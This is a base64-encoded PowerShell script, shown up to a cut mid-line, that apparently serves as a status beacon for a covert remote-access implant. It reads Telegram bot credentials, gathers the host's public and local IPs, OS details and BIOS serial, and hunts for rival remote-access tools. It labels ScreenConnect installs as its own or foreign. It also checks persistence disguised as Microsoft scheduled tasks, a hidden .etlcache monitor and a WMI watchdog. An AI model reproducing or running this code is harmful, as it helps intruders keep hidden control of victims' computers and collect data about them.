Cg0KJEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJw0KJFByb2dyZXNz
UHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJw0KdHJ5IHsgW05ldC5TZXJ2aWNlUG9pbnRN
YW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpU
bHMxMiB9IGNhdGNoIHt9DQoNCmZ1bmN0aW9uIEdldC1DZmcgew0KICAgICRwYXRoID0gSm9pbi1Q
YXRoICRXb3JrRGlyICdub3RpZnkuY2ZnJw0KICAgICRjZmcgPSBAe30NCiAgICBpZiAoLW5vdCAo
VGVzdC1QYXRoICRwYXRoKSkgeyByZXR1cm4gJGNmZyB9DQogICAgR2V0LUNvbnRlbnQgLUxpdGVy
YWxQYXRoICRwYXRoIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICBpZiAoJF8gLW1hdGNoICde
XHMqKFtBLVphLXowLTlfXSspXHMqPVxzKiguKilccyokJykgew0KICAgICAgICAgICAgJGNmZ1sk
bWF0Y2hlc1sxXV0gPSAkbWF0Y2hlc1syXS5UcmltKCkNCiAgICAgICAgfQ0KICAgIH0NCiAgICBy
ZXR1cm4gJGNmZw0KfQ0KDQpmdW5jdGlvbiBFc2MoW3N0cmluZ10kcykgew0KICAgIGlmICgkbnVs
bCAtZXEgJHMpIHsgcmV0dXJuICcnIH0NCiAgICByZXR1cm4gKCRzIC1yZXBsYWNlICcmJywgJyZh
bXA7JyAtcmVwbGFjZSAnPCcsICcmbHQ7JyAtcmVwbGFjZSAnPicsICcmZ3Q7JykNCn0NCg0KZnVu
Y3Rpb24gR2V0LVB1YmxpY0lwIHsNCiAgICBmb3JlYWNoICgkdSBpbiBAKA0KICAgICAgICAgICAg
J2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZycsDQogICAgICAgICAgICAnaHR0cHM6Ly9pZmNvbmZpZy5t
ZS9pcCcsDQogICAgICAgICAgICAnaHR0cHM6Ly9pY2FuaGF6aXAuY29tJw0KICAgICAgICApKSB7
DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICAkciA9IEludm9rZS1XZWJSZXF1ZXN0IC1Vcmkg
JHUgLVVzZUJhc2ljUGFyc2luZyAtVGltZW91dFNlYyA2DQogICAgICAgICAgICAkaXAgPSAoJHIu
Q29udGVudCB8IE91dC1TdHJpbmcpLlRyaW0oKQ0KICAgICAgICAgICAgaWYgKCRpcCAtbWF0Y2gg
J15cZHsxLDN9KFwuXGR7MSwzfSl7M30kJyAtb3IgJGlwIC1tYXRjaCAnOicpIHsgcmV0dXJuICRp
cCB9DQogICAgICAgIH0gY2F0Y2gge30NCiAgICB9DQogICAgcmV0dXJuICduL2EnDQp9DQoNCmZ1
bmN0aW9uIEdldC1Mb2NhbElwcyB7DQogICAgdHJ5IHsNCiAgICAgICAgJGlwcyA9IEdldC1OZXRJ
UEFkZHJlc3MgLUFkZHJlc3NGYW1pbHkgSVB2NCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
ZSB8DQogICAgICAgICAgICBXaGVyZS1PYmplY3QgeyAkXy5JUEFkZHJlc3MgLW5vdGxpa2UgJzEy
Ny4qJyAtYW5kICRfLlByZWZpeE9yaWdpbiAtbmUgJ1dlbGxLbm93bicgfSB8DQogICAgICAgICAg
ICBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBJUEFkZHJlc3MgLVVuaXF1ZQ0KICAgICAg
ICBpZiAoJGlwcykgeyByZXR1cm4gKCRpcHMgLWpvaW4gJywgJykgfQ0KICAgIH0gY2F0Y2gge30N
CiAgICB0cnkgew0KICAgICAgICAkaXBzID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX05ldHdvcmtB
ZGFwdGVyQ29uZmlndXJhdGlvbiAtRmlsdGVyICdJUEVuYWJsZWQ9VHJ1ZScgfA0KICAgICAgICAg
ICAgRm9yRWFjaC1PYmplY3QgeyAkXy5JUEFkZHJlc3MgfSB8IFdoZXJlLU9iamVjdCB7ICRfIC1h
bmQgJF8gLW5vdGxpa2UgJzEyNy4qJyAtYW5kICRfIC1ub3RsaWtlICcqOionIH0NCiAgICAgICAg
aWYgKCRpcHMpIHsgcmV0dXJuICgoJGlwcyB8IFNlbGVjdC1PYmplY3QgLVVuaXF1ZSkgLWpvaW4g
JywgJykgfQ0KICAgIH0gY2F0Y2gge30NCiAgICByZXR1cm4gJ24vYScNCn0NCg0KZnVuY3Rpb24g
R2V0LU9zSW5mbyB7DQogICAgJG8gPSBbb3JkZXJlZF1Aew0KICAgICAgICBDYXB0aW9uID0gJ24v
YSc7IFZlcnNpb24gPSAnbi9hJzsgQnVpbGQgPSAnbi9hJzsgQXJjaCA9ICduL2EnDQogICAgICAg
IERvbWFpbiA9ICduL2EnOyBJbnN0YWxsRGF0ZSA9ICduL2EnOyBMYXN0Qm9vdCA9ICduL2EnDQog
ICAgICAgIENQVSA9ICduL2EnOyBNYW51ZmFjdHVyZXIgPSAnbi9hJzsgTW9kZWwgPSAnbi9hJzsg
U2VyaWFsID0gJ24vYScNCiAgICAgICAgVG90YWxSQU1fR0IgPSAnbi9hJzsgRGlza0ZyZWVfR0Ig
PSAnbi9hJzsgRGlza1NpemVfR0IgPSAnbi9hJw0KICAgIH0NCiAgICB0cnkgew0KICAgICAgICAk
b3MgPSBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfT3BlcmF0aW5nU3lzdGVtDQogICAgICAgICRvLkNh
cHRpb24gPSAkb3MuQ2FwdGlvbg0KICAgICAgICAkby5WZXJzaW9uID0gJG9zLlZlcnNpb24NCiAg
ICAgICAgJG8uQnVpbGQgPSAkb3MuQnVpbGROdW1iZXINCiAgICAgICAgJG8uQXJjaCA9ICRvcy5P
U0FyY2hpdGVjdHVyZQ0KICAgICAgICAkby5JbnN0YWxsRGF0ZSA9ICgkb3MuSW5zdGFsbERhdGUg
fCBHZXQtRGF0ZSAtRm9ybWF0ICd5eXl5LU1NLWRkJykNCiAgICAgICAgJG8uTGFzdEJvb3QgPSAo
JG9zLkxhc3RCb290VXBUaW1lIHwgR2V0LURhdGUgLUZvcm1hdCAneXl5eS1NTS1kZCBISDptbScp
DQogICAgICAgICRvLlRvdGFsUkFNX0dCID0gW21hdGhdOjpSb3VuZCgkb3MuVG90YWxWaXNpYmxl
TWVtb3J5U2l6ZSAvIDFNQiwgMSkNCiAgICB9IGNhdGNoIHt9DQogICAgdHJ5IHsNCiAgICAgICAg
JGNzID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX0NvbXB1dGVyU3lzdGVtDQogICAgICAgICRvLkRv
bWFpbiA9IGlmICgkY3MuUGFydE9mRG9tYWluKSB7ICRjcy5Eb21haW4gfSBlbHNlIHsgJGNzLldv
cmtncm91cCB9DQogICAgICAgICRvLk1hbnVmYWN0dXJlciA9ICRjcy5NYW51ZmFjdHVyZXINCiAg
ICAgICAgJG8uTW9kZWwgPSAkY3MuTW9kZWwNCiAgICB9IGNhdGNoIHt9DQogICAgdHJ5IHsNCiAg
ICAgICAgJG8uQ1BVID0gKEdldC1DaW1JbnN0YW5jZSBXaW4zMl9Qcm9jZXNzb3IgfCBTZWxlY3Qt
T2JqZWN0IC1GaXJzdCAxIC1FeHBhbmRQcm9wZXJ0eSBOYW1lKQ0KICAgIH0gY2F0Y2gge30NCiAg
ICB0cnkgew0KICAgICAgICAkby5TZXJpYWwgPSAoR2V0LUNpbUluc3RhbmNlIFdpbjMyX0JJT1Mp
LlNlcmlhbE51bWJlcg0KICAgIH0gY2F0Y2gge30NCiAgICB0cnkgew0KICAgICAgICAkZCA9IEdl
dC1DaW1JbnN0YW5jZSBXaW4zMl9Mb2dpY2FsRGlzayAtRmlsdGVyICJEZXZpY2VJRD0nQzonIg0K
ICAgICAgICAkby5EaXNrRnJlZV9HQiA9IFttYXRoXTo6Um91bmQoJGQuRnJlZVNwYWNlIC8gMUdC
LCAxKQ0KICAgICAgICAkby5EaXNrU2l6ZV9HQiA9IFttYXRoXTo6Um91bmQoJGQuU2l6ZSAvIDFH
QiwgMSkNCiAgICB9IGNhdGNoIHt9DQogICAgcmV0dXJuICRvDQp9DQoNCmZ1bmN0aW9uIEdldC1T
dmNMaW5lKFtzdHJpbmddJG5hbWUpIHsNCiAgICAkcyA9IEdldC1TZXJ2aWNlIC1OYW1lICRuYW1l
IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgaWYgKC1ub3QgJHMpIHsgcmV0dXJu
ICdOT1QgSU5TVEFMTEVEJyB9DQogICAgcmV0dXJuICgnezB9IChTdGFydD17MX0pJyAtZiAkcy5T
dGF0dXMsICRzLlN0YXJ0VHlwZSkNCn0NCg0KZnVuY3Rpb24gR2V0LVRhc2tIZWFsdGgoW3N0cmlu
Z10kdG4pIHsNCiAgICAkb3V0ID0gJiBzY2h0YXNrcy5leGUgL1F1ZXJ5IC9UTiAkdG4gL0ZPIExJ
U1QgL1YgMj4kbnVsbA0KICAgIGlmICgkTEFTVEVYSVRDT0RFIC1uZSAwIC1vciAtbm90ICRvdXQp
IHsNCiAgICAgICAgcmV0dXJuIEB7IFByZXNlbnQgPSAkZmFsc2U7IFN0YXR1cyA9ICdNSVNTSU5H
JzsgTmV4dCA9ICcnOyBMYXN0ID0gJyc7IFJlc3VsdCA9ICcnIH0NCiAgICB9DQogICAgJG1hcCA9
IEB7fQ0KICAgIGZvcmVhY2ggKCRsaW5lIGluICRvdXQpIHsNCiAgICAgICAgaWYgKCRsaW5lIC1t
YXRjaCAnXlxzKihbXjpdKyk6XHMqKC4qKVxzKiQnKSB7DQogICAgICAgICAgICAkbWFwWyRtYXRj
aGVzWzFdLlRyaW0oKV0gPSAkbWF0Y2hlc1syXS5UcmltKCkNCiAgICAgICAgfQ0KICAgIH0NCiAg
ICAkc3RhdHVzID0gJG1hcFsnU3RhdHVzJ10NCiAgICBpZiAoLW5vdCAkc3RhdHVzKSB7ICRzdGF0
dXMgPSAkbWFwWydUYXNrIFN0YXR1cyddIH0NCiAgICBpZiAoLW5vdCAkc3RhdHVzKSB7ICRzdGF0
dXMgPSAncHJlc2VudCcgfQ0KICAgICRuZXh0ID0gJG1hcFsnTmV4dCBSdW4gVGltZSddDQogICAg
aWYgKC1ub3QgJG5leHQpIHsgJG5leHQgPSAnJyB9DQogICAgJGxhc3QgPSAkbWFwWydMYXN0IFJ1
biBUaW1lJ10NCiAgICBpZiAoLW5vdCAkbGFzdCkgeyAkbGFzdCA9ICcnIH0NCiAgICAkcmVzdWx0
ID0gJG1hcFsnTGFzdCBSZXN1bHQnXQ0KICAgIGlmICgtbm90ICRyZXN1bHQpIHsgJHJlc3VsdCA9
ICcnIH0NCiAgICAkaGVhbHRoeSA9ICgkc3RhdHVzIC1tYXRjaCAnUmVhZHl8UnVubmluZycpIC1v
ciAoJHN0YXR1cyAtZXEgJ3ByZXNlbnQnKQ0KICAgIHJldHVybiBAew0KICAgICAgICBQcmVzZW50
ID0gJHRydWUNCiAgICAgICAgSGVhbHRoeSA9IFtib29sXSRoZWFsdGh5DQogICAgICAgIFN0YXR1
cyAgPSAkc3RhdHVzDQogICAgICAgIE5leHQgICAgPSAkbmV4dA0KICAgICAgICBMYXN0ICAgID0g
JGxhc3QNCiAgICAgICAgUmVzdWx0ICA9ICRyZXN1bHQNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIEdl
dC1SbW1IaXRzIHsNCiAgICAkdG9rZW5zID0gQCgNCiAgICAgICAgJ0FueURlc2snLCAnVGVhbVZp
ZXdlcicsICd0dm5zZXJ2ZXInLCAnRFdBZ2VudCcsICdEV1NlcnZpY2UnLCAnTG9nTWVJbicsICdM
TUlHdWFyZGlhbicsDQogICAgICAgICdXaW5WTkMnLCAndm5jc2VydmVyJywgJ3R2XycsICdTcGxh
c2h0b3AnLCAnWm9obycsICdSdXN0RGVzaycsICdSZW1vdGVQQycsICdEYW1lV2FyZScsDQogICAg
ICAgICdBdGVyYUFnZW50JywgJ0F0ZXJhJywgJ05pbmphUk1NJywgJ05pbmphT25lJywgJ05pbmph
JywgJ0thc2V5YScsICdQdWxzZXdheScsICdTeW5jcm8nLA0KICAgICAgICAnU3VwZXJPcHMnLCAn
TWFuYWdlRW5naW5lJywgJ1NvbGFyV2luZHMnLCAnQ29ubmVjdFdpc2UnLCAnTFRTZXJ2aWNlJywg
J0xhYlRlY2gnLA0KICAgICAgICAnQWN0aW9uMScsICdTaW1wbGVIZWxwJywgJ0JvbWdhcicsICdC
ZXlvbmRUcnVzdCcsICdNZXNoQWdlbnQnLCAnTWVzaCBDZW50cmFsJywNCiAgICAgICAgJ1RhY3Rp
Y2FsUk1NJywgJ3RhY3RpY2Fscm1tJywgICAgICAgICAnR2V0U2NyZWVuJywgJ1N1cHJlbW8nLCAn
cnV0c2VydicsICdyZW1vdGluZ19ob3N0JywNCiAgICAgICAgJ0Nocm9tZSBSZW1vdGUgRGVza3Rv
cCcsICdQYXJzZWMnLCAnTmV0U3VwcG9ydCcsICdMZXZlbC5pbycsICdMZXZlbCBBZ2VudCcsDQog
ICAgICAgICdEYXR0byBSTU0nLCAnQ29udGludXVtJw0KICAgICkNCiAgICAkaGl0cyA9IE5ldy1P
YmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddDQogICAgJHNlZW4g
PSBAe30NCg0KICAgIGZ1bmN0aW9uIEFkZC1IaXQoW3N0cmluZ10ka2luZCwgW3N0cmluZ10kbmFt
ZSkgew0KICAgICAgICAka2V5ID0gIiRraW5kfCRuYW1lIi5Ub0xvd2VySW52YXJpYW50KCkNCiAg
ICAgICAgaWYgKCRzZWVuLkNvbnRhaW5zS2V5KCRrZXkpKSB7IHJldHVybiB9DQogICAgICAgICRz
ZWVuWyRrZXldID0gJHRydWUNCiAgICAgICAgW3ZvaWRdJGhpdHMuQWRkKCgnLSBbezB9XSA8Y29k
ZT57MX08L2NvZGU+JyAtZiAka2luZCwgKEVzYyAkbmFtZSkpKQ0KICAgIH0NCg0KICAgIEdldC1T
ZXJ2aWNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgew0K
ICAgICAgICAkbiA9ICRfLk5hbWUNCiAgICAgICAgJGQgPSAkXy5EaXNwbGF5TmFtZQ0KICAgICAg
ICBpZiAoJG4gLWxpa2UgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicpIHsgcmV0dXJuIH0NCiAgICAg
ICAgZm9yZWFjaCAoJHQgaW4gJHRva2Vucykgew0KICAgICAgICAgICAgaWYgKCRuIC1saWtlICIq
JHQqIiAtb3IgJGQgLWxpa2UgIiokdCoiKSB7DQogICAgICAgICAgICAgICAgQWRkLUhpdCAnc3Zj
JyAoIiRuICgkKCRfLlN0YXR1cykpIikNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAg
ICAgfQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgR2V0LVByb2Nlc3MgLUVycm9yQWN0aW9uIFNp
bGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICRuID0gJF8uUHJvY2Vz
c05hbWUNCiAgICAgICAgaWYgKCRuIC1saWtlICcqU2NyZWVuQ29ubmVjdConKSB7IHJldHVybiB9
DQogICAgICAgIGZvcmVhY2ggKCR0IGluICR0b2tlbnMpIHsNCiAgICAgICAgICAgIGlmICgkbiAt
bGlrZSAiKiR0KiIpIHsNCiAgICAgICAgICAgICAgICBBZGQtSGl0ICdwcm9jJyAkbg0KICAgICAg
ICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQoNCiAgICAk
dW5pbnN0ID0gQCgNCiAgICAgICAgJ0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1
cnJlbnRWZXJzaW9uXFVuaW5zdGFsbFwqJywNCiAgICAgICAgJ0hLTE06XFNPRlRXQVJFXFdPVzY0
MzJOb2RlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbFwqJw0KICAg
ICkNCiAgICBmb3JlYWNoICgkcGF0aCBpbiAkdW5pbnN0KSB7DQogICAgICAgIEdldC1JdGVtUHJv
cGVydHkgJHBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVj
dCB7DQogICAgICAgICAgICAkZG4gPSBbc3RyaW5nXSRfLkRpc3BsYXlOYW1lDQogICAgICAgICAg
ICBpZiAoLW5vdCAkZG4pIHsgcmV0dXJuIH0NCiAgICAgICAgICAgIGlmICgkZG4gLWxpa2UgJypT
Y3JlZW5Db25uZWN0KicpIHsgcmV0dXJuIH0NCiAgICAgICAgICAgIGZvcmVhY2ggKCR0IGluICR0
b2tlbnMpIHsNCiAgICAgICAgICAgICAgICBpZiAoJGRuIC1saWtlICIqJHQqIikgew0KICAgICAg
ICAgICAgICAgICAgICBBZGQtSGl0ICdtc2knICRkbg0KICAgICAgICAgICAgICAgICAgICBicmVh
aw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0K
ICAgIHJldHVybiAkaGl0cw0KfQ0KDQpmdW5jdGlvbiBHZXQtU2NJbnN0YWxscyB7DQogICAgJGxp
c3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5nXQ0K
ICAgIEdldC1TZXJ2aWNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgV2hlcmUtT2Jq
ZWN0IHsgJF8uTmFtZSAtbGlrZSAnU2NyZWVuQ29ubmVjdCBDbGllbnQqJyB9IHwgRm9yRWFjaC1P
YmplY3Qgew0KICAgICAgICAkZnAgPSBpZiAoJF8uTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZdezE2
fSlcKScpIHsgJG1hdGNoZXNbMV0gfSBlbHNlIHsgJz8nIH0NCiAgICAgICAgJHRhZyA9IGlmICgk
ZnAgLWVxICc1ZjYwMTA1Nzk4NTJlNTA3JykgeyAnS0VFUC1QUklNQVJZJyB9DQogICAgICAgIGVs
c2VpZiAoJGZwIC1lcSAnZjg2MWM4MTQwZDQ1MzQyNycpIHsgJ0tFRVAtQUxUJyB9DQogICAgICAg
IGVsc2UgeyAnRk9SRUlHTicgfQ0KICAgICAgICBbdm9pZF0kbGlzdC5BZGQoKCctIDxjb2RlPnsw
fTwvY29kZT46IDxiPnsxfTwvYj4gW3syfV0nIC1mIChFc2MgJF8uTmFtZSksIChFc2MgKFtzdHJp
bmddJF8uU3RhdHVzKSksICR0YWcpKQ0KICAgIH0NCg0KICAgICRyb290cyA9IEAoDQogICAgICAg
ICIke2VudjpQcm9ncmFtRmlsZXN9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIsDQogICAgICAgICIk
e2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU2NyZWVuQ29ubmVjdCBDbGllbnQqIg0KICAgICkNCiAg
ICBmb3JlYWNoICgkcGF0IGluICRyb290cykgew0KICAgICAgICBHZXQtQ2hpbGRJdGVtIC1QYXRo
ICRwYXQgLURpcmVjdG9yeSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gt
T2JqZWN0IHsNCiAgICAgICAgICAgIFt2b2lkXSRsaXN0LkFkZCgoJy0gcGF0aDogPGNvZGU+ezB9
PC9jb2RlPicgLWYgKEVzYyAkXy5GdWxsTmFtZSkpKQ0KICAgICAgICB9DQogICAgfQ0KDQogICAg
JHVuaW5zdCA9IEAoDQogICAgICAgICdIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xD
dXJyZW50VmVyc2lvblxVbmluc3RhbGxcKicsDQogICAgICAgICdIS0xNOlxTT0ZUV0FSRVxXT1c2
NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxcKicNCiAg
ICApDQogICAgZm9yZWFjaCAoJHBhdGggaW4gJHVuaW5zdCkgew0KICAgICAgICBHZXQtSXRlbVBy
b3BlcnR5ICRwYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgV2hlcmUtT2JqZWN0
IHsNCiAgICAgICAgICAgICRfLkRpc3BsYXlOYW1lIC1saWtlICcqU2NyZWVuQ29ubmVjdConDQog
ICAgICAgIH0gfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAkdmVyID0gaWYgKCRfLkRp
c3BsYXlWZXJzaW9uKSB7ICRfLkRpc3BsYXlWZXJzaW9uIH0gZWxzZSB7ICc/JyB9DQogICAgICAg
ICAgICBbdm9pZF0kbGlzdC5BZGQoKCctIG1zaTogPGNvZGU+ezB9PC9jb2RlPiB2ezF9JyAtZiAo
RXNjICRfLkRpc3BsYXlOYW1lKSwgKEVzYyAkdmVyKSkpDQogICAgICAgIH0NCiAgICB9DQoNCiAg
ICBpZiAoJGxpc3QuQ291bnQgLWVxIDApIHsgW3ZvaWRdJGxpc3QuQWRkKCctIChub25lKScpIH0N
CiAgICByZXR1cm4gJGxpc3QNCn0NCg0KJGNmZyA9IEdldC1DZmcNCmlmICgtbm90ICRjZmcuQk9U
X1RPS0VOIC1vciAtbm90ICRjZmcuQ0hBVF9JRCkgew0KICAgIEFkZC1Db250ZW50IC1MaXRlcmFs
UGF0aCAoSm9pbi1QYXRoICRXb3JrRGlyICdib290LmVycicpIC1WYWx1ZSAndGdfc2tpcF9ub19j
ZmcnIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgZXhpdCAyDQp9DQoNCiRwcmlt
ID0gJ1NjcmVlbkNvbm5lY3QgQ2xpZW50ICg1ZjYwMTA1Nzk4NTJlNTA3KScNCiRhbHQgPSAnU2Ny
ZWVuQ29ubmVjdCBDbGllbnQgKGY4NjFjODE0MGQ0NTM0MjcpJw0KJG9zID0gR2V0LU9zSW5mbw0K
JHdobyA9IFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgp
Lk5hbWUNCiRlbGV2ID0gKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c1ByaW5jaXBhbF1bU2Vj
dXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1cnJlbnQoKSkuSXNJblJvbGUo
DQogICAgW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdOjpBZG1pbmlzdHJh
dG9yKQ0KJGlzU3lzdGVtID0gJHdobyAtbGlrZSAnKlNZU1RFTSonIC1vciAkd2hvIC1lcSAnTlQg
QVVUSE9SSVRZXFNZU1RFTScNCg0KJG1zaUNhY2hlID0gSm9pbi1QYXRoICRXb3JrRGlyICdwa2cu
bXNpJw0KJG1zaVNpemUgPSBpZiAoVGVzdC1QYXRoICRtc2lDYWNoZSkgew0KICAgICd7MDpOMH0g
S0InIC1mICgoR2V0LUl0ZW0gJG1zaUNhY2hlIC1Gb3JjZSkuTGVuZ3RoIC8gMUtCKQ0KfSBlbHNl
IHsgJ25vbmUnIH0NCg0KJG1vblBhdGggPSBKb2luLVBhdGggJFdvcmtEaXIgJ293bl9tb24uY21k
Jw0KJGV0bE1vbiA9ICIkZW52OlByb2dyYW1EYXRhXE1pY3Jvc29mdFxEaWFnbm9zaXNcU3RhdGVc
LmV0bGNhY2hlXGV0bF9tb24uY21kIg0KJGhhc01vbiA9IFRlc3QtUGF0aCAkbW9uUGF0aA0KJGhh
c0V0bCA9IFRlc3QtUGF0aCAkZXRsTW9uDQoNCiMgcGVyLWhvc3QgaWRlbnRpdHk6IGV4cGVjdGVk
IHRhc2sgbmFtZXMgY29tZSBmcm9tIGlkZW50aXR5LmNmZyB3aGVuIHByZXNlbnQNCiRpZENmZyA9
IEpvaW4tUGF0aCAkV29ya0RpciAnaWRlbnRpdHkuY2ZnJw0KJGlkTWFwID0gQHt9DQppZiAoVGVz
dC1QYXRoICRpZENmZykgew0KICAgIEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkaWRDZmcgfCBG
b3JFYWNoLU9iamVjdCB7DQogICAgICAgIGlmICgkXyAtbWF0Y2ggJ15ccyooW0EtWl9dKylccyo9
XHMqKC4rPylccyokJykgeyAkaWRNYXBbJG1hdGNoZXNbMV1dID0gJG1hdGNoZXNbMl0gfQ0KICAg
IH0NCn0NCiRleHBlY3RlZFRhc2tzID0gQCgNCiAgICBAeyBOYW1lID0gJChpZiAoJGlkTWFwLlRB
U0tfQSkgeyAkaWRNYXAuVEFTS19BIH0gZWxzZSB7ICdcTWljcm9zb2Z0XFdpbmRvd3NcRGlhZ25v
c2lzXFNjaGVkdWxlZCcgfSk7IFJvbGUgPSAidGljayAkKCRpZE1hcC5NT19BKW0gKGNoYWluMSki
IH0sDQogICAgQHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5UQVNLX0IpIHsgJGlkTWFwLlRBU0tfQiB9
IGVsc2UgeyAnXE1pY3Jvc29mdFxXaW5kb3dzXFBMQVxTZXJ2ZXInIH0pOyBSb2xlID0gImJhY2t1
cCAkKCRpZE1hcC5NT19CKW0gKGNoYWluMSkiIH0sDQogICAgQHsgTmFtZSA9ICQoaWYgKCRpZE1h
cC5UQVNLX0MpIHsgJGlkTWFwLlRBU0tfQyB9IGVsc2UgeyAnXE1pY3Jvc29mdFxXaW5kb3dzXFdE
SVxSZXNvbHV0aW9uSG9zdCcgfSk7IFJvbGUgPSAnT05TVEFSVCAoY2hhaW4xKScgfSwNCiAgICBA
eyBOYW1lID0gJChpZiAoJGlkTWFwLlRBU0tfRCkgeyAkaWRNYXAuVEFTS19EIH0gZWxzZSB7ICdc
TWljcm9zb2Z0XFdpbmRvd3NcVGNwaXBcSXBBZGRyZXNzQ29uZmxpY3QxJyB9KTsgUm9sZSA9ICdP
TkxPR09OIChjaGFpbjEpJyB9DQopDQojIGNoYWluIDI6IFdNSSB3YXRjaGRvZyBzdWJzY3JpcHRp
b24NCiR3bWlDID0gR2V0LVdtaU9iamVjdCAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1D
bGFzcyBDb21tYW5kTGluZUV2ZW50Q29uc3VtZXIgLUZpbHRlciAiTmFtZT0nV3VjYWNoZVdhdGNo
ZG9nQyciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQokZXhwZWN0ZWRUYXNrcyArPSBA
eyBOYW1lID0gJ1xXTUlcV3VjYWNoZVdhdGNoZG9nQyc7IFJvbGUgPSAndGltZXIgM20gKGNoYWlu
MiknOyBXbWkgPSAoJG51bGwgLW5lICR3bWlDKSB9DQoNCiR0YXNrTGluZXMgPSBOZXctT2JqZWN0
IFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5nXQ0KJHRhc2tPayA9IDANCiR0
YXNrQmFkID0gMA0KZm9yZWFjaCAoJHQgaW4gJGV4cGVjdGVkVGFza3MpIHsNCiAgICBpZiAoJHQu
Q29udGFpbnNLZXkoJ1dtaScpKSB7DQogICAgICAgIGlmICgkdC5XbWkpIHsgJHRhc2tPaysrOyAk
bWFyayA9ICdPSycgfSBlbHNlIHsgJHRhc2tCYWQrKzsgJG1hcmsgPSAnTUlTU0lORycgfQ0KICAg
ICAgICBbdm9pZF0kdGFza0xpbmVzLkFkZCgoJy0gW3swfV0gPGNvZGU+ezF9PC9jb2RlPiAtIHsy
fScgLWYgJG1hcmssIChFc2MgJHQuTmFtZSksIChFc2MgJHQuUm9sZSkpKQ0KICAgICAgICBjb250
aW51ZQ0KICAgIH0NCiAgICAkaCA9IEdldC1UYXNrSGVhbHRoICR0Lk5hbWUNCiAgICBpZiAoJGgu
UHJlc2VudCAtYW5kICRoLkhlYWx0aHkpIHsNCiAgICAgICAgJHRhc2tPaysrDQogICAgICAgICRt
YXJrID0gJ09LJw0KICAgIH0gZWxzZWlmICgkaC5QcmVzZW50KSB7DQogICAgICAgICR0YXNrQmFk
KysNCiAgICAgICAgJG1hcmsgPSAnV0VBSycNCiAgICB9IGVsc2Ugew0KICAgICAgICAkdGFza0Jh
ZCsrDQogICAgICAgICRtYXJrID0gJ01JU1NJTkcnDQogICAgfQ0KICAgICRleHRyYSA9ICcnDQog
ICAgaWYgKCRoLlByZXNlbnQpIHsNCiAgICAgICAgJGJpdHMgPSBAKCkNCiAgICAgICAgaWYgKCRo
LlN0YXR1cykgeyAkYml0cyArPSAkaC5TdGF0dXMgfQ0KICAgICAgICBpZiAoJGguUmVzdWx0IC1u
ZSAnJyAtYW5kICRoLlJlc3VsdCAtbmUgJzAnKSB7ICRiaXRzICs9ICgiTGFzdFJlc3VsdD0iICsg
JGguUmVzdWx0KSB9DQogICAgICAgIGlmICgkYml0cy5Db3VudCkgeyAkZXh0cmEgPSAnICgnICsg
KCRiaXRzIC1qb2luICcsICcpICsgJyknIH0NCiAgICB9DQogICAgW3ZvaWRdJHRhc2tMaW5lcy5B
ZGQoKCctIFt7MH1dIDxjb2RlPnsxfTwvY29kZT4gLSB7Mn17M30nIC1mICRtYXJrLCAoRXNjICR0
Lk5hbWUpLCAoRXNjICR0LlJvbGUpLCAoRXNjICRleHRyYSkpKQ0KfQ0KDQokcHJpbUxpbmUgPSBH
